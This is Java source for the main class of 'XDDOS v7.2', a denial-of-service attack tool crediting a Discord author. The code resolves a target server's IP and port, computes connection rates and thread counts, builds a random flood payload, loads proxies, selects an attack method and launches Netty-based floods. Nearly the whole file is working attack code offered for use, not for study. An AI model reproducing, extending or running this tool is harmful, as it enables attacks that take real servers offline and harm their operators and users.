package XD.XDDOS;

import java.io.File;
import java.net.InetAddress;
import java.util.Arrays;
import java.util.Random;

import XD.XDDOS.methods.IMethod;
import XD.XDDOS.methods.Methods;
import XD.XDDOS.utils.NettyBootstrap;
import XD.XDDOS.utils.helper.ArgsHelper;
import XD.XDDOS.utils.helper.ServerAddress;
import XD.XDDOS.utils.helper.Update;
import XD.XDDOS.utils.proxy.ProxyLoader;

public class XDDOS {

   public static File proxyFile;
   public static String origIP;
   public static String srvRecord;
   public static InetAddress resolved;
   public static int port;
   public static int protcolID;
   public static int protocolLength;
   public static String methodID;
   public static IMethod method;
   public static int duration;
   public static int targetCPS;
   public static int nettyThreads;
   public static int loopThreads;
   public static String string;
   public static ProxyLoader proxies;
   public static int cpuselect;
   public static String serverhp;
   public static final String DISCORD_USERNAME = "CatOnDrugs#1521";
   public static boolean attackRunning = false;

   public static String RED_BOLD = "\033[1;31m";    // RED
   public static String GREEN_BOLD = "\033[1;32m";  // GREEN
   public static String PURPLE_BOLD = "\033[1;35m"; // PURPLE
   public static String WHITE_BOLD = "\033[1;37m";  // WHITE
   public static String RESET = "\033[0m";
   public static String CYAN_BOLD = "\033[1;36m";   // CYAN_BOLD

   public static void main(String[] args) throws Throwable {
      System.setProperty("file.encoding", "UTF-8");
      if(Arrays.toString(args).contains("-noansi"))
      {
         RED_BOLD = "";
         GREEN_BOLD = "";
         PURPLE_BOLD = "";
         WHITE_BOLD = "";
         RESET = "";
         CYAN_BOLD = "";
      }
      System.out.println();
      System.out.println();
      System.out.println(WHITE_BOLD + "██╗  ██╗██████╗ ██████╗  ██████╗ ███████╗\n" +
                                      "╚██╗██╔╝██╔══██╗██╔══██╗██╔═══██╗██╔════╝\n" +
                                      " ╚███╔╝ ██║  ██║██║  ██║██║   ██║███████╗\n" +
                                      " ██╔██╗ ██║  ██║██║  ██║██║   ██║╚════██║\n" +
                                      "██╔╝ ██╗██████╔╝██████╔╝╚██████╔╝███████║\n" +
                                      "╚═╝  ╚═╝╚═════╝ ╚═════╝  ╚═════╝ ╚══════╝\n v7.2" +
                                      "\n" + RED_BOLD +
                                      "MADE BY: " + WHITE_BOLD + DISCORD_USERNAME +"\n" + WHITE_BOLD + "> " + PURPLE_BOLD +
                                      "DISCORD: " + GREEN_BOLD + "https://dsc.gg/TEAMXD\n" + WHITE_BOLD + "> " + WHITE_BOLD +
                                      "Starting XDDOS :-\n" + RESET +
                                      "\n" + GREEN_BOLD +
                                      "STARTING\n" + RESET );

      if(args.length == 1) {
         args[0] = "-update";
         Update.updateJAR();
      }
      
      if(args.length < 6){
         ArgsHelper.UserFrndly(args);
      }
      else{
         ArgsHelper.OneLine(args);
      }
   }

   public static void run() throws Throwable {
      if (!attackRunning) {
         attackRunning = true;
         try {
            System.out.println(GREEN_BOLD+"["+RED_BOLD+"XDDOS"+GREEN_BOLD+"]"+WHITE_BOLD+" Resolving Target IP...");
            ServerAddress sa = ServerAddress.getAddrss(serverhp);
            srvRecord = sa.getIP();
            port = sa.getPort();
            resolved = InetAddress.getByName(srvRecord);
            System.out.println(GREEN_BOLD+"["+WHITE_BOLD+"Resolved IP:"+GREEN_BOLD+"]"+WHITE_BOLD+" "+ resolved.getHostAddress()+"\n"+RESET);
            origIP = serverhp.split(":")[0];
            targetCPS = cpuselect + (int) Math.ceil((double) cpuselect / 100 * (50 + (double) cpuselect / 5000));
            nettyThreads = targetCPS == -1 ? 256 : (int) Math.ceil(6.4E-4D * (double) targetCPS);
            loopThreads = targetCPS == -1 ? 3 : (int) Math.ceil(1.999960000799984E-5D * (double) targetCPS);
            protocolLength = protcolID > 128 ? 3 : 2;
            System.out.println("nettyThreads: " + nettyThreads+"\nloopThreads: " + loopThreads);
            Random r = new Random();
            for (int i = 1; i < 65536; ++i) string = string + (char) (r.nextInt(125) + 1);

         } catch (Exception var4) {
            var4.printStackTrace();
            Thread.sleep(5000L);
            return;
         }

         Methods.setupMethods();
         method = Methods.getMethod(methodID);
         System.out.println(GREEN_BOLD+"["+WHITE_BOLD+"Running Method:"+GREEN_BOLD+"]"+WHITE_BOLD+" "+ method.toString().split("@")[0]+"\n"+RESET);

         NettyBootstrap.start();
      }
   }

   }
